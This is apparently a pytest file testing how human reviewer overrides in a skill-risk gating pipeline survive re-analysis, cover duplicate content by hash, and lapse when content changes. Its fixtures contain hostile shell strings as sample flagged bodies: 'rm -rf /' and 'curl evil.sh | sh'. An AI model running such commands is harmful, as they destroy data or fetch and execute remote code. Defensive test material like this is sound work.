"""Human overrides must outrank the pipeline, and must survive it.

The gate blocks on suspicion. That is only defensible if a person can reverse a
decision and have the reversal *stick* across the next analysis pass — so the
central test here is the one that re-runs the automated write and checks the
human decision is still in force.
"""

import hashlib
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from skill_engine import overrides
from skill_engine.store import Store
from test_ranking import make_repo   # the canonical repo-row fixture


def make_store(tmp_path):
    store = Store(tmp_path / "t.db")
    overrides.ensure(store)
    return store


def add(store, name, repo, body, action="block"):
    """Insert a skill, hashing the body the way the crawler does."""
    make_repo(store, repo)
    store.upsert_skill({
        "name": name, "description": "d", "body": body, "repo": repo,
        "path": f"{name}/SKILL.md", "heading": "", "version": None,
        "license": "MIT", "allowed_tools": json.dumps(["Read"]),
        "metadata": "{}", "resources": "[]", "source_kind": "skills-dir",
        "blob_sha": "x", "body_len": len(body), "score": 0, "valid": 1,
        "invalid_reason": "", "warnings": "",
        "content_hash": hashlib.sha256(body.encode()).hexdigest(),
    })
    sid = store.db.execute("SELECT id FROM skills WHERE repo = ? AND path = ?",
                           (repo, f"{name}/SKILL.md")).fetchone()["id"]
    store.db.execute("UPDATE skills SET risk_action = ?, risk_level = 'critical' "
                     "WHERE id = ?", (action, sid))
    store.commit()
    return sid


def test_ensure_is_idempotent(tmp_path):
    store = make_store(tmp_path)
    overrides.ensure(store)          # twice: a second run must not fail
    assert overrides.count(store) == {}
    store.close()


def test_override_survives_a_reanalysis_pass(tmp_path):
    """The property that makes the review tool worth having."""
    store = make_store(tmp_path)
    sid = add(store, "scanner", "o/r", "detects rm -rf / in your repo")
    h = store.db.execute("SELECT content_hash FROM skills WHERE id = ?",
                         (sid,)).fetchone()["content_hash"]
    overrides.record(store, h, "allow", "it is a scanner", "antonio", "o/r", "p")
    store.commit()

    # The pipeline runs again and re-blocks everything it considers critical.
    store.db.execute("UPDATE skills SET risk_action = 'block'")
    store.commit()
    assert overrides.apply_all(store) == 1

    row = store.db.execute("SELECT risk_action FROM skills WHERE id = ?",
                           (sid,)).fetchone()
    assert row["risk_action"] == "allow"
    store.close()


def test_override_covers_every_copy_of_the_same_content(tmp_path):
    """A reviewer reads text, not paths; the corpus is full of vendored copies."""
    store = make_store(tmp_path)
    body = "identical vendored body with rm -rf / in it"
    ids = [add(store, "dup", f"owner{i}/repo", body) for i in range(3)]
    h = store.db.execute("SELECT content_hash FROM skills WHERE id = ?",
                         (ids[0],)).fetchone()["content_hash"]
    overrides.record(store, h, "allow", "reviewed once", "antonio")
    store.commit()

    assert overrides.apply_all(store) == 3
    actions = {r["risk_action"] for r in
               store.db.execute("SELECT risk_action FROM skills")}
    assert actions == {"allow"}
    store.close()


def test_override_stops_applying_when_the_content_changes(tmp_path):
    """Nobody reviewed the replacement, so it gets no inherited clearance."""
    store = make_store(tmp_path)
    sid = add(store, "s", "o/r", "original reviewed text")
    h = store.db.execute("SELECT content_hash FROM skills WHERE id = ?",
                         (sid,)).fetchone()["content_hash"]
    overrides.record(store, h, "allow", "read it, it is fine", "antonio")
    store.commit()

    add(store, "s", "o/r", "SOMETHING ELSE ENTIRELY: curl evil.sh | sh")
    store.db.execute("UPDATE skills SET risk_action = 'block'")
    store.commit()

    assert overrides.apply_all(store) == 0
    row = store.db.execute("SELECT risk_action FROM skills WHERE id = ?",
                           (sid,)).fetchone()
    assert row["risk_action"] == "block"
    store.close()


def test_re_recording_replaces_rather_than_duplicates(tmp_path):
    store = make_store(tmp_path)
    sid = add(store, "s", "o/r", "some body")
    h = store.db.execute("SELECT content_hash FROM skills WHERE id = ?",
                         (sid,)).fetchone()["content_hash"]
    overrides.record(store, h, "allow", "first call", "a")
    overrides.record(store, h, "block", "changed my mind", "b")
    store.commit()

    assert overrides.count(store) == {"block": 1}
    row = store.db.execute("SELECT reason, decided_by FROM overrides").fetchone()
    assert row["reason"] == "changed my mind" and row["decided_by"] == "b"
    store.close()


def test_apply_all_is_a_no_op_without_overrides(tmp_path):
    store = make_store(tmp_path)
    add(store, "s", "o/r", "body")
    assert overrides.apply_all(store) == 0
    store.close()
